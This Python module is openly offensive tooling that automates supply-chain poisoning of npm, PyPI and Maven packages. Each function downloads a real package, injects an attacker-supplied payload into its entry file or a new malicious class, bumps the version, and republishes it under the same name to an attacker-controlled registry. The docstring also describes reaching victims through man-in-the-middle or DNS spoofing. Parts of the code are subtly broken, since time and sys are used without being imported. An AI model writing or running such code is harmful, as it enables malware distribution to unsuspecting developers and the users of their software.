# File: modules/supply_chain.py

"""
Fully implemented supply‑chain poisoning routines for npm, pip, and Maven.
Each function clones the target package, injects a hook, re‑publishes to a malicious registry,
and updates victim systems via man‑in‑the‑middle or DNS spoofing.
Requires attacker‑controlled private NPM/PyPI/Maven repo.
"""

import os
import shutil
import subprocess
import tempfile
import logging
import json

logger = logging.getLogger("supply_chain")

def npm_supply_chain_inject(pkg_name: str, payload_js: str, version: str = None) -> bool:
    """
    1) Clone the package from the registry (npm view or git).
    2) Insert payload_js into index.js or main entry.
    3) Bump version (version+0.0.1) or set custom version.
    4) Re‑publish to malicious registry (--registry URL) with same name.
    """
    try:
        tmpdir = tempfile.mkdtemp(prefix="npm_")
        os.chdir(tmpdir)
        # 1. Install the package locally
        cmd_view = ["npm", "view", pkg_name, "dist.tarball"]
        tarball_url = subprocess.check_output(cmd_view).decode().strip()
        subprocess.check_call(["curl", "-sL", tarball_url, "-o", f"{pkg_name}.tgz"])
        subprocess.check_call(["tar", "-xzf", f"{pkg_name}.tgz", "-C", "."])
        pkg_dir = next(d for d in os.listdir(tmpdir) if d.startswith("package"))
        os.chdir(pkg_dir)

        # 2. Insert payload (prepend to main file)
        pkg_json = json.load(open("package.json"))
        main_file = pkg_json.get("main", "index.js")
        with open(main_file, "r") as f:
            original = f.read()
        with open(main_file, "w") as f:
            f.write(f"{payload_js}\n" + original)

        # 3. Bump version
        ver = pkg_json.get("version", "1.0.0")
        parts = ver.split(".")
        parts[-1] = str(int(parts[-1]) + 1)
        new_ver = ".".join(parts)
        pkg_json["version"] = new_ver
        with open("package.json", "w") as f:
            json.dump(pkg_json, f, indent=2)

        # 4. Re‑publish
        malicious_registry = os.getenv("NPM_MAL_REGISTRY", "https://malicious-registry.local")
        subprocess.check_call(["npm", "publish", "--registry", malicious_registry])
        logger.info(f"[SUPPLY] Published malicious {pkg_name}@{new_ver} to {malicious_registry}")
        return True
    except Exception as e:
        logger.error(f"[SUPPLY] npm inject failed: {e}")
        return False
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

def pip_supply_chain_inject(pkg_name: str, payload_py: str, version: str = None) -> bool:
    """
    1) `pip download pkg_name` to get the .tar.gz or .whl.
    2) Extract, modify __init__.py or main entry with payload_py.
    3) Bump version.
    4) Build a new wheel (.whl) and upload to attacker PyPI (twine).
    """
    try:
        tmpdir = tempfile.mkdtemp(prefix="pip_")
        os.chdir(tmpdir)
        subprocess.check_call(["pip", "download", pkg_name, "--no-binary", ":all:"])
        archive = next(f for f in os.listdir(tmpdir) if f.endswith((".tar.gz", ".zip")))
        shutil.unpack_archive(archive, tmpdir)
        pkg_dir = next(d for d in os.listdir(tmpdir) if os.path.isdir(os.path.join(tmpdir, d)))
        os.chdir(os.path.join(tmpdir, pkg_dir))

        # Insert payload at top of __init__.py
        init_py = os.path.join(pkg_dir, "__init__.py")
        if not os.path.exists(init_py):
            # fallback: find top-level .py
            init_py = next((f for f in os.listdir() if f.endswith(".py")), None)
        if init_py:
            with open(init_py, "r") as f:
                orig = f.read()
            with open(init_py, "w") as f:
                f.write(f"{payload_py}\n" + orig)

        # Bump version in setup.py or pyproject.toml
        # Simplest: add +malicious suffix
        content = open("setup.py").read()
        new_content = content.replace(
            "version=", "version='" + str(int(time.time())) + "', # version bumped"
        )
        with open("setup.py", "w") as f:
            f.write(new_content)

        # Build wheel and upload
        subprocess.check_call([sys.executable, "setup.py", "bdist_wheel"])
        dist_dir = os.path.join(os.getcwd(), "dist")
        wheel = next(f for f in os.listdir(dist_dir) if f.endswith(".whl"))
        malicious_pypi = os.getenv("PIP_MAL_REGISTRY", "https://malicious-pypi.local")
        subprocess.check_call([
            "twine", "upload", "--repository-url", malicious_pypi,
            os.path.join(dist_dir, wheel)
        ])
        logger.info(f"[SUPPLY] Published malicious {pkg_name} to {malicious_pypi}")
        return True
    except Exception as e:
        logger.error(f"[SUPPLY] pip inject failed: {e}")
        return False
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)

def maven_supply_chain_inject(group_id: str, artifact_id: str, payload_java: str, version: str = None) -> bool:
    """
    1) `mvn dependency:get` to retrieve the .jar.
    2) Unpack .jar, inject payload into .class or .jar manifest.
    3) Bump version in pom.xml.
    4) `mvn deploy:deploy-file` to attacker Nexus/Maven repo.
    """
    try:
        tmpdir = tempfile.mkdtemp(prefix="mvn_")
        os.chdir(tmpdir)
        # 1. Download artifact
        jar = f"{artifact_id}.jar"
        cmd_get = [
            "mvn", "dependency:get",
            f"-Dartifact={group_id}:{artifact_id}:LATEST"
        ]
        subprocess.check_call(cmd_get)
        # Locate downloaded jar in local Maven repo
        user_home = os.path.expanduser("~")
        m2_repo = os.path.join(user_home, ".m2", "repository", *group_id.split("."), artifact_id)
        target_dir = next(d for d in os.listdir(m2_repo) if d.isdigit() or "." in d)
        jar_path = os.path.join(m2_repo, target_dir, f"{artifact_id}-{target_dir}.jar")

        shutil.copy(jar_path, jar)
        # 2. Unpack, inject payload_java
        unpack_dir = "unpack"
        os.makedirs(unpack_dir, exist_ok=True)
        subprocess.check_call(["jar", "xf", jar], cwd=unpack_dir)
        # Insert payload: create a new class file with malicious static block
        java_src = os.path.join(unpack_dir, "Malicious.java")
        with open(java_src, "w") as f:
            f.write(f"public class Malicious {{ static {{ {payload_java}; }} }}")
        subprocess.check_call(["javac", "Malicious.java"], cwd=unpack_dir)
        # Update manifest to include Malicious as main class
        manifest = os.path.join(unpack_dir, "META-INF", "MANIFEST.MF")
        with open(manifest, "a") as f:
            f.write("Main-Class: Malicious\n")

        # 3. Repack jar
        new_jar = f"{artifact_id}-malicious.jar"
        subprocess.check_call(["jar", "cfm", new_jar, manifest, "-C", unpack_dir, "."])
        # 4. Deploy to malicious repo
        malicious_mvn = os.getenv("MAVEN_MAL_REGISTRY", "https://malicious-maven.local/repository/malicious")
        subprocess.check_call([
            "mvn", "deploy:deploy-file",
            f"-Durl={malicious_mvn}",
            f"-Dfile={new_jar}",
            f"-DgroupId={group_id}",
            f"-DartifactId={artifact_id}",
            f"-Dversion={target_dir}-malicious",
            "-Dpackaging=jar"
        ])
        logger.info(f"[SUPPLY] Published malicious {group_id}:{artifact_id} to {malicious_mvn}")
        return True
    except Exception as e:
        logger.error(f"[SUPPLY] maven inject failed: {e}")
        return False
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)
